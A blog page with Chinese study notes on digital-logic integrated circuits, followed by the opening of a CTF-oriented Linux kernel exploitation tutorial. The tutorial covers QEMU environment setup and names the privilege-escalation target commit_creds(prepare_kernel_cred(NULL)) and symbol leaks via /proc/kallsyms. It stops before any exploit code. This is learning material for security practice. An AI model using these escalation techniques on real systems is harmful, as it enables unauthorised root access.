    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-Chapter-7%E2%80%94%E2%80%94%E4%B8%AD%E8%A7%84%E6%A8%A1%E9%80%9A%E7%94%A8%E9%9B%86%E6%88%90%E7%94%B5%E8%B7%AF%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-Chapter-7%E2%80%94%E2%80%94%E4%B8%AD%E8%A7%84%E6%A8%A1%E9%80%9A%E7%94%A8%E9%9B%86%E6%88%90%E7%94%B5%E8%B7%AF%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8/" class="post-title-link" itemprop="url">数字逻辑 Chapter 7——中规模通用集成电路及其应用</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:27:43" itemprop="dateCreated datePublished" datetime="2023-02-28T22:27:43+08:00">2023-02-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="7-1-常用中规模组合逻辑电路"><a href="#7-1-常用中规模组合逻辑电路" class="headerlink" title="7.1 常用中规模组合逻辑电路"></a>7.1 常用中规模组合逻辑电路</h1><p>包含二进制并行加法器、译码器、编码器、多路选择器和多路分配器等。</p>
<h2 id="7-1-1-二进制并行加法器"><a href="#7-1-1-二进制并行加法器" class="headerlink" title="7.1.1 二进制并行加法器"></a>7.1.1 二进制并行加法器</h2><p>能够并行产生两个n为二进制数“算数和”的逻辑部件。按照进位方式不同可分为<strong>串行进位二进制并行加法器</strong>和<strong>超前进位二进制并行加法器</strong>两种类型。</p>
<ol>
<li>构成思想</li>
</ol>
<ul>
<li>串行二进制并行加法器<br>由全加器级联构成，高位的“和”依赖于来自低位的进位。被加数和加数各位能够并行到达各位输入，各位全加器的进位输入按照从低位到高位逐级串行传递。这里的每一位单独计算，第二位要等到第一位计算完成后才能计算，因此运算速度较慢。</li>
<li>超前进位二进制并行加法器<br>超前进位二进制并行加法器通过对输入的两个数进行逻辑运算，直接判断哪一位需要进位，无需进行等待。这里对输入两数进行逻辑运算需要进行一些分析。<br>如果两数的某一位都是1，那么这一位必然有进位，因此定义$G_i&#x3D;A_iB_i$为进位产生函数，且此时低位的进位就等于本位的进位。如果两数的某一位只有1个是1，那么此时低位的进位输入能够传送到本位的进位输出，因此定义$P_i&#x3D;A_i\oplus B_i$。由此可得第i位的输出$F_i&#x3D;A_i\oplus B_i\oplus C_{i-1}&#x3D;P_i\oplus C_{i-1}$，第i位的进位$C_i&#x3D;P_iC_{i-1}+G_i$<br>可以根据上面的结论直接写出每一位进位的表达式函数。</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/2f6bdd1f184e4d80afe6a2e78c6f8a2b.png"></p>
<ol start="2">
<li>典型芯片</li>
</ol>
<p>二进制并行加法器74283,16引脚，其中$C_0$为来自低位的进位，$FC_4$为输出高位的进位。</p>
<p><img src="https://img-blog.csdnimg.cn/a3680df8f24c410fa9093041d1a8d277.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<p>功能：不仅限于加法。</p>
<blockquote>
<ol>
<li>使用加法器进行2进制减法操作<br>如果要使用加法器进行减法操作，需要将减数转换成补码输入。转换成补码需要对每一位取反后再加1，这里的加1可以输入到原低位进位输入端。每一次相减会有4种情况：</li>
</ol>
<ul>
<li>被减数为正数，减数也为正数。此时若结果为正，则原高位进位输出端输出1；若结果为负，则原高位进位输出端输出0。</li>
<li>被减数为负数，减数也为负数。此时若结果为正，则原高位进位输出端输出1,；若结果为负，则原高位进位输出端输出0。</li>
<li>被减数为正数，减数为负数。此时原最高位进位输出端必为0，但可能产生正数溢出导致结果为负数。</li>
<li>被减数为负数，减数为正数。此时原最高位进位输出端必为1，但可能产生负数溢出导致结果为正数。<br>判断溢出的设计思路：首先根据两数最高位判断其为正数还是负数，然后将判断结果与计算结果进行分析。如果两数均为正数但结果为负，或两数均为负数但结果为正，则产生溢出。实际上就是判断两个输入数与输出数的最高位的关系。<br>如果需要对加法器进行级联处理以进行更多位数的减法，那么每一个4位加法器中两数将不再有正负数的概念，均看做无符号正整数。此时仅需考虑第一种情况。<br>对低位借位处理的设计思路：当低位不存在借位时，需要在原低位进位输入端中输入1以构造补码，存在借位时输入0即相当于借位减1。<br>对向高位借位处理的设计思路：当本位需要借位时，原高位进位输出端为0，由于对于高位而言，输入0表示需要借位，因此可<strong>直接将本位原高位进位输出与高位原低位进位输出相连</strong>。</li>
</ul>
<ol start="2">
<li>使用加法器计算余三码的加法<br>余三码比8421码多3，计算规律：两个1位余三码相加若无进位，则需将结果减3输出，如有进位，则需将结果加3输出。进位时会产生进位信息，<strong>可将低位进位输入与高位进位输出直接相连</strong></li>
<li>使用加法器计算4位2进制数乘法<br>4位二进制乘法的结果至多8位，可以通过输入列出竖式求出每一位的表达式：<br><img src="https://img-blog.csdnimg.cn/2a562437a51049ad8f3125d6aa615678.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>这里的计算思路是：由于最低位不可能有进位，因此直接将$y_0x_0$输出即可。后面的位可能有进位，这里先取下图红色方框的8位相加，将最低位直接输出，高3位加进位与绿色框的4位相加；将结果最低位直接输出，高3位加进位再与蓝色框的4位相加，最终获得结果。<br><img src="https://img-blog.csdnimg.cn/abdd73877f064336ac35bb4077300609.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></li>
<li>使用加法器进行4位2421码的加法<br>2421码加法的计算规律：</li>
</ol>
<ul>
<li>如果两位均小于5，计算结果若小于5直接输出，否则加5输出</li>
<li>如果两位均大于5，产生进位，计算结果若大于4直接输出，否则减5输出</li>
<li>如果两位中一位大于4，一位小于5，则将结果直接输出，有进位输出进位</li>
</ul>
<ol start="5">
<li>使用加法器进行4位8421码的加法<br>8421码加法的加法规律：</li>
</ol>
<ul>
<li>如果结果小于10，则直接输出</li>
<li>如果结果大于10且无进位，则减10输出同时输出进位</li>
<li>如果结果大于10且有进位，则加6输出同时输出进位</li>
</ul>
</blockquote>
<h2 id="7-2-译码器和解码器"><a href="#7-2-译码器和解码器" class="headerlink" title="7.2 译码器和解码器"></a>7.2 译码器和解码器</h2><h3 id="1-译码器"><a href="#1-译码器" class="headerlink" title="1. 译码器"></a>1. 译码器</h3><p>常见二进制译码器、二-十进制译码器和数字显示译码器</p>
<ol>
<li>二进制译码器<br>二进制译码器能将n个输入转换为$2^n$个输出，且输出函数与由输入变量构成最小项具有对应关系的一种多输出组合逻辑电路。其中有一个或多个使能输入端，其为有效电平时译码器才工作，对一组输入代码仅有一个输出为有效电平。<br>常用MSI二进制译码器：2-4线译码器、3-8线译码器（74138）</li>
</ol>
<p><img src="https://img-blog.csdnimg.cn/cfea971f89944397a478c401518c285a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"><br><img src="https://img-blog.csdnimg.cn/9c5ecc7c1d834431a302b99afb82d7b8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<p>可以看到，使能端$S_1,S_2,S_3$必须都为1才工作。</p>
<p>功能：不仅限于译码。</p>
<blockquote>
<p>(1) 使用译码器实现n个变量的表达式输出<br>这里一般通过将表达式转化为最小项或画出卡诺图加以处理。如要求使用3-8线译码器输出逻辑函数$\sum m(1,4,5,7,8,10,11)$，1个3-8线译码器仅有8个输出，不足以产生16个输出，因此使用两个3-8线译码器。其中随机选取一个输入变量输入到使能端，规定当该变量取值为0时使用哪一个译码器，取值为1时使用另一个译码器。将满足函数条件的最小项全部连入一个与非门，即可在与非门后获得函数的正确输出。电路图如下，输入从低到高为：CBAD<br><img src="https://img-blog.csdnimg.cn/e8f7a99c8f2e466d9bfa1542eb98e3b0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_11,color_FFFFFF,t_70,g_se,x_16"></p>
</blockquote>
<ol start="2">
<li>二-十进制译码器<br>将4位BCD码的10组代码翻译成10个与十进制数字符号对应的输出信号。7442低电平有效。</li>
</ol>
<p><img src="https://img-blog.csdnimg.cn/dd54d7e42156460fbb434bf13ea1abfd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_19,color_FFFFFF,t_70,g_se,x_16"><br><img src="https://img-blog.csdnimg.cn/9dc139572584409e9b36ef12879ec5df.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<p>当产生非法的BCD码时，7442拒绝译码，避免产生错误信息</p>
<ol start="3">
<li>七段显示译码器<br>用于进行数字显示的译码器，输出接入液晶数码管用于显示。</li>
</ol>
<p><img src="https://img-blog.csdnimg.cn/fa83b1f2b2654be88b57ed30fc5d1be5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"><br><img src="https://img-blog.csdnimg.cn/0ceebf86565346c99ce711330cd56739.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<p>$\overline {BI}&#x2F;\overline {BRO}$：熄灭输入端（低电平有效），有时作为输入信号有时输出信号。当作为输入时，其为低电平则所有灯灭；当作为输出时，当$\overline {LT}&#x3D;1,\overline {RBI}&#x3D;0$且输入数码为全0时，$\overline {RBO}&#x3D;0$；否则$\overline {RBO}&#x3D;1$。其主要用于多个数字显示多个译码器的连接。<br>$\overline {LT}$：灯测试端，当$\overline {LT}&#x3D;0,\overline {BI}&#x3D;1$时所有灯全亮。<br>$\overline {RBI}$：灭0输入端，熄灭前置0，即无意义0的显示。$\overline {LT}&#x3D;1,\overline {RBI}&#x3D;0$且输入为全0时，不显示0。</p>
<h3 id="2-编码器"><a href="#2-编码器" class="headerlink" title="2. 编码器"></a>2. 编码器</h3><p>二-十进制编码器、优先编码器。</p>
<ol>
<li>二-十进制编码器<br>将10进制数字0-9分别编成BCD码，输入端10个，输出端4个。</li>
</ol>
<p><img src="https://img-blog.csdnimg.cn/b9fbae06362445f9ae7e708c8716e4db.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<ol start="2">
<li>优先编码器</li>
</ol>
<p>上面的二-十进制编码器的输入信号互斥，任何时候只允许一个输入端为有效信号。优先编码器将所有输入确定一个优先级，当多个信号同时输入时，会选择最高优先级的信号输出编码。<br>74148优先编码器输入与输出端均以低电平为有效电平，即若$\overline {I_7}&#x3D;0$，则输出为000。<br>$\overline {I_S}$为选通输入端（允许输入端），当其为0时编码器才工作<br>$O_S$为选通输出端（允许输出端），当$\overline {I_S}&#x3D;0$且无信号输入时$O_S&#x3D;0$<br>$\overline {O_{EX}}$为工作状态标志，当$\overline {I_S}&#x3D;0$且有信号输入时才为0<br>上面两个端口用于扩展编码。如果要对16个输入进行优先编码，则共有4个输出。令一个编码器编码输入0~7，另一个编码8~15，当输入信号为高8位时禁用处理低位的编码器防止两个编码器同时有信号输入而产生错误输出。<br><img src="https://img-blog.csdnimg.cn/5a107eb041cb4f7096999014c526845e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"><br><img src="https://img-blog.csdnimg.cn/7060520679ee42d6a4af630f2abb810f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<p>由上图可知输入下标越大优先级越高。</p>
<h2 id="7-1-3-多路选择器和多路分配器"><a href="#7-1-3-多路选择器和多路分配器" class="headerlink" title="7.1.3 多路选择器和多路分配器"></a>7.1.3 多路选择器和多路分配器</h2><h3 id="1-多路选择器"><a href="#1-多路选择器" class="headerlink" title="1. 多路选择器"></a>1. 多路选择器</h3><p>具有$2^n$个输入和n个选择控制变量，根据选择控制变量决定输出是输入的哪一个。<br>双4路 MUX 74153、8路 MUX 74152&#x2F;74151和16路 MUX 74150</p>
<p><img src="https://img-blog.csdnimg.cn/095f9f1b924646d4a6a95f326a93603c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"><br><img src="https://img-blog.csdnimg.cn/4026440b87df443ea6541eb0c2449942.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<blockquote>
<p><strong>应用：</strong></p>
<ul>
<li><font color=red>用带有n个选择控制变量的MUX实现含有n个变量的函数的输出</font><br>将函数的真值表依次输入到对应的输入端，通过将变量输入到选择控制变量，就能获得相应的输出。<br>假设输入从0到7分别为0,0,1,1,1,1,0,0，选择控制变量为$A_0,A_1,A_2$。则该选择器的输出相当于求$A_1\oplus A_2$，对应真值表：</li>
</ul>
</blockquote>
<table>
<thead>
<tr>
<th align="center">A2\A1A0</th>
<th align="center">00</th>
<th align="center">01</th>
<th align="center">11</th>
<th align="center">10</th>
</tr>
</thead>
<tbody><tr>
<td align="center">0</td>
<td align="center">0</td>
<td align="center">0</td>
<td align="center">1</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">1</td>
<td align="center">1</td>
<td align="center">1</td>
<td align="center">0</td>
<td align="center">0</td>
</tr>
</tbody></table>
<blockquote>
<p>即$I_i&#x3D;m_i$，$m_i$表示第i个由输入变量组成的最小项。</p>
<ul>
<li><font color=red>用带有n个选择控制变量的MUX实现含有n+1个变量的函数的输出</font><br>此时选择控制变量的输入端数量不足，需要随机选择一个控制变量按照某种方式输入到$2^n$个输入中去。<br>假设需要实现如下真值表的功能：</li>
</ul>
</blockquote>
<table>
<thead>
<tr>
<th align="center">A3A2\A1A0</th>
<th align="center">00</th>
<th align="center">01</th>
<th align="center">11</th>
<th align="center">10</th>
</tr>
</thead>
<tbody><tr>
<td align="center">00</td>
<td align="center">0</td>
<td align="center">1</td>
<td align="center">1</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">01</td>
<td align="center">1</td>
<td align="center">1</td>
<td align="center">1</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">11</td>
<td align="center">0</td>
<td align="center">0</td>
<td align="center">0</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">10</td>
<td align="center">0</td>
<td align="center">0</td>
<td align="center">1</td>
<td align="center">1</td>
</tr>
</tbody></table>
<blockquote>
<p>假设控制变量输入选择$A_0,A_1,A_2$，那么其选择的实际上是两个状态，至于这两个状态如何区分需要看$A_3$的值如何。<br><img src="https://img-blog.csdnimg.cn/19ba65f226ee48e99ed5d311de1425a0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>可以将真值表按照$A_0,A_1,A_2$的8种取值分为8块，分别对每一块进行分析，求出每一块中数值与$A_3$的关系。电路图如下所示。<br><img src="https://img-blog.csdnimg.cn/076ddbb4b1e1404788e3fd195876e104.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_19,color_FFFFFF,t_70,g_se,x_16"></p>
<ul>
<li><font color=red>用带有n个选择控制变量的MUX实现含有大于n+1个变量的函数的输出</font><br>思想与处理n+1个变量的输出相同。<br>例：用一个2-4线选择器实现上面一个例子的真值表。<br>将$A_1,A_0$作为控制变量输入，可将真值表按照$A_1,A_0$的4种取值划分为4块：<br><img src="https://img-blog.csdnimg.cn/279d6b63f32f4f5389054060673479d0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>当$A_0A_1&#x3D;00$时，输出与$A_3,A_2$的关系为：$O&#x3D;\overline {A_3}A_2$<br>当$A_0A_1&#x3D;01$时，输出与$A_3,A_2$的关系为：$O&#x3D;\overline {A_3}$<br>当$A_0A_1&#x3D;11$时，输出与$A_3,A_2$的关系为：$O&#x3D;\overline {A_3A_2}$<br>当$A_0A_1&#x3D;10$时，输出与$A_3,A_2$的关系为：$O&#x3D;\overline {\overline {A_3}A_2}$<br>电路图如下所示：<br><img src="https://img-blog.csdnimg.cn/0a7ffdb108684616802d39fcda008a4a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_18,color_FFFFFF,t_70,g_se,x_16"></li>
</ul>
</blockquote>
<h3 id="2-多路分配器"><a href="#2-多路分配器" class="headerlink" title="2. 多路分配器"></a>2. 多路分配器</h3><p>单输入多输出，从哪一路输出取决于选择控制变量，与选择器相反。</p>
<blockquote>
<p><strong>应用：</strong><br>将译码器与选择器结合为比较器：一个数输入到译码器中获得8个输出，将这8个输出接到选择器中，选择器控制变量输入第二个数，如果两数相等，则输出应该为0，否则会输出1。</p>
</blockquote>
<h1 id="7-2-常用中规模时序逻辑电路"><a href="#7-2-常用中规模时序逻辑电路" class="headerlink" title="7.2 常用中规模时序逻辑电路"></a>7.2 常用中规模时序逻辑电路</h1><h2 id="7-2-1-集成计数器"><a href="#7-2-1-集成计数器" class="headerlink" title="7.2.1 集成计数器"></a>7.2.1 集成计数器</h2><h3 id="1-集成同步计数器"><a href="#1-集成同步计数器" class="headerlink" title="1. 集成同步计数器"></a>1. 集成同步计数器</h3><p>由4位二进制同步加法计数器74161、单时钟4位二进制同步可逆计数器74191、单时钟十进制可逆计数器74190、双时钟4位二进制同步可逆计数器74193等</p>
<p><img src="https://img-blog.csdnimg.cn/e3fab0732e4a4a188c69cdab7954ec8e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<p>输入信号说明：<br>$CLR$：清除端，高电平强制清除<br>$\overline {LD}$：预置控制，高电平时执行自增或自减操作，自增或自减取决于时钟信号<br>$D,C,B,A$：预置初值，前两个信号为低电平时直接为计数器赋值<br>$CP_U\uparrow$：累加计数脉冲<br>$CP_D\uparrow$：累减计数脉冲<br>输出信号：<br>$Q_i$：计数值<br>$\bar Q_{CC}$：进位输出负脉冲<br>$\bar Q_{CB}$：结尾输出负脉冲</p>
<p><img src="https://img-blog.csdnimg.cn/f096437fde834b5c8f18b2a4dcba37eb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<blockquote>
<p>应用：构成任意模的计数器<br>如果需要构成模小于16的计数器，则只需对输出进行判断，达到某个值后触发电平连接CLR端清零即可。如果模大于16，则需要将多个这样的计数器串联（将进位端与计数脉冲连接），对输出进行统一判断，同样是达到某个值后触发电平连接CLR端清零。</p>
</blockquote>
<h3 id="2-集成异步计数器"><a href="#2-集成异步计数器" class="headerlink" title="2. 集成异步计数器"></a>2. 集成异步计数器</h3><p>二—五—十进制加法计数器74290</p>
<p><img src="https://img-blog.csdnimg.cn/c8c4f6f114ed4281a7af7fad25de459a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"><br><img src="https://img-blog.csdnimg.cn/cdbbb4287e0c40d9a13fd2b095e8786a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>功能描述：（注意上图的计数是在<font color=red><strong>下降沿</strong></font>产生的！）</p>
<ol>
<li>异步清零：$R_{9A}\cdot R_{9B}&#x3D;0,R_{0A}&#x3D;R_{0B}&#x3D;1$时直接对$Q_A,Q_B,Q_C,Q_D$清零</li>
<li>异步置9：$R_{9A}&#x3D;R_{9B}&#x3D;1$时直接置9使$Q_DQ_CQ_BQ_A&#x3D;1001$</li>
<li>计数：$R_{9A}\cdot R_{9B}&#x3D;0,R_{0A}\cdot R_{0B}&#x3D;0$时计数：<br> (1) 模2计数：计数脉冲接到$CP_A$从$Q_A$输出<br> (2) 模5计数：计数脉冲接到$CP_B$从$Q_DQ_CQ_B$输出<br> (3) 模10计数：将模2计数的输出接到模5脉冲输入或将模5计数的输出接到模2脉冲输入（两种计数方式相同计数的输出不同）</li>
</ol>
<p><img src="https://img-blog.csdnimg.cn/a22a15abb0f043b590f9beb70b9795bf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"><br><img src="https://img-blog.csdnimg.cn/c586270b5e8f43d588f529cf911391c6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<h2 id="7-2-2-集成寄存器"><a href="#7-2-2-集成寄存器" class="headerlink" title="7.2.2 集成寄存器"></a>7.2.2 集成寄存器</h2><p>寄存器：数字系统中用于存放数据或运算结果的一种常用逻辑器件。<br>功能：接收数据、保存数据、传送数据、左右移位、串并输入输出、预置、清零等</p>
<p>一、典型芯片：74194——4位双向移位寄存器<br><img src="https://img-blog.csdnimg.cn/ed15f318cc3c455b8a2c765bb8df80e2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_19,color_FFFFFF,t_70,g_se,x_16"><br>输入信号说明：<br>$\overline {CLR}$：清零<br>$DCBA$：并行数据输入<br>$D_R$：右移串行数据输入，右移后置于最高位<br>$D_L$：左移串行数据输入，左移后置于最低位<br>$S_1,S_0$：工作方式选择：$S_1S_0&#x3D;00$保持，$&#x3D;01$右移，$&#x3D;10$左移，$&#x3D;11$并行输入<br>$CP$：工作脉冲<br>输出信号说明：<br>$Q_DQ_CQ_BQ_A$：寄存器状态<br><img src="https://img-blog.csdnimg.cn/cc3d6ce4f98144cb8eb891ab35cebd92.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/Kernel-Pwn-%E5%85%A5%E9%97%A8-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/Kernel-Pwn-%E5%85%A5%E9%97%A8-1/" class="post-title-link" itemprop="url">Kernel Pwn 入门 (1)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-02-28 22:27:42 / Modified: 22:54:19" itemprop="dateCreated datePublished" datetime="2023-02-28T22:27:42+08:00">2023-02-28</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/kernel-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">kernel pwn 系列</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>与用户态程序的pwn不同，Kernel Pwn针对于内核态的漏洞进行，门槛也较用户态pwn更高些。本文分享笔者近来初学Kernel Pwn的经验与教训。</p>
<p>Kernel pwn的环境搭建与基础知识介绍参考<a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/02/21/NOTE-0X02-LINUX-KERNEL-PWN-PART-I/#Pre-%E5%AE%89%E8%A3%85%E4%BE%9D%E8%B5%96">这里</a>，笔者认为是一个很好的kernel pwn入门教程系列，本文提到的搭建环境、题目分析等都可以找到，本文也主要参考这个系列的文章编写，若阅读本文存在任何疑问请移步上面的链接。</p>
<p>CTF题目下载地址：<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges">github</a><br />
<code>git clone https://github.com/ctf-wiki/ctf-challenges</code>（内含3道kernel pwn入门题）</p>
<h1 id="搭建环境需要注意的问题"><a class="markdownIt-Anchor" href="#搭建环境需要注意的问题"></a> 搭建环境需要注意的问题</h1>
<ol>
<li>笔者的kernel pwn环境在ubuntu 20.04上搭建，与参考文档保持一致。之前使用Kali安装，环境没问题，但题目做不了，rootfs.cpio无法解压。无奈只能在ubuntu上重装一次。建议使用ubuntu 20.04搭建此环境，否则可能产生意想不到且在网上都很难找到解决方法的问题。</li>
<li>运行一个kernel需要打开CPU虚拟化，对于ubuntu 20.04虚拟机，则是打开这两个选项（必须关闭虚拟机才能够勾选）：<br />
<img src="https://img-blog.csdnimg.cn/3775fa08fc0e4c759b9c4d5f371000d2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="" /></li>
</ol>
<h1 id="经验与教训"><a class="markdownIt-Anchor" href="#经验与教训"></a> 经验与教训</h1>
<p>在一般的pwn中，我们只能跟着题目程序的意思来，各种配各种凑只为执行一次<code>system(&quot;/bin/sh&quot;)</code>；而在Kernel pwn中，我们需要跟着LKM的意思来，在内核中各种配各种凑只为执行一次<code>commit_creds(prepare_kernel_cred(NULL))</code>。从这个角度上看，两种形式的pwn在根本上并没有区别。一般题目中都是在自定义的LKM上下文章，所以我们需要重点关注。</p>
<p>另外，根据笔者对两个入门kernel pwn题的初步分析，两道题的cpio文件实际上是经过gzip压缩的，在做题时最好首先file一下确认文件类型，<strong>如果不是cpio文件则在本地调试时则应按照原先的打包方式打包回去</strong>，否则可能会出现无法启动等问题。有的题目会给出打包文件系统的shell文件，需要重点关注。<s>（搞了两个小时才知道，我说怎么自己打包的cpio比题目给的大这么多）</s> 如果题目给的内核跑不动，可以尝试将boot.sh中申请的内存改大些（即qemu的-m选项后面，如果64M跑不动就改成128M试试）。</p>
<p>在入门测试时，经常会遇到内核启动不了，一直在重启的情况，将控制台强行叉掉后再开启可能会显示：<code>qemu-system-x86_64: -s: Failed to find an available port: Address already in use</code>。这是因为强制关闭后，qemu占用的端口还未被清除。解决方法：使用<code>lsof -i tcp:&lt;port&gt;</code>命令查看指定端口的占用情况，在start.sh中看到了qemu后的-s选项说明默认端口为1234。此时即输入<code>lsof -i tcp:1234</code>，找到占用的pid将其kill即可：<code>kill &lt;pid&gt;</code></p>
<p>明确了我们需要做什么，再去看题目就不会一脸懵了。</p>
<h1 id="kernel-pwn首杀强网杯2018-corerop法"><a class="markdownIt-Anchor" href="#kernel-pwn首杀强网杯2018-corerop法"></a> Kernel pwn首杀——强网杯2018 Core（ROP法）</h1>
<p>这是一道经典的Kernel pwn入门题。<br />
<code>etc/init.d/rcS</code>文件或根目录下的<code>init</code>文件是内核刚刚开始运行时就会执行的文件，题目中一般进行初始化内核环境搭建工作，必须仔细阅读。<br />
在init文件中，我们发现<code>insmod /core.ko</code>这个语句，加载了一个core.ko，这个就是自定义的LKM。另外，通过<code>cat /proc/kallsyms &gt; /tmp/kallsyms</code>可知，我们可以获取到所有内核函数的符号表，这样我们可以轻松地找到commit_cred函数的地址，又由于boot.sh中并未开启内核的KPTI保护，因此虽然开启了KASLR，但这些内核函数我们可以直接访问。</p>
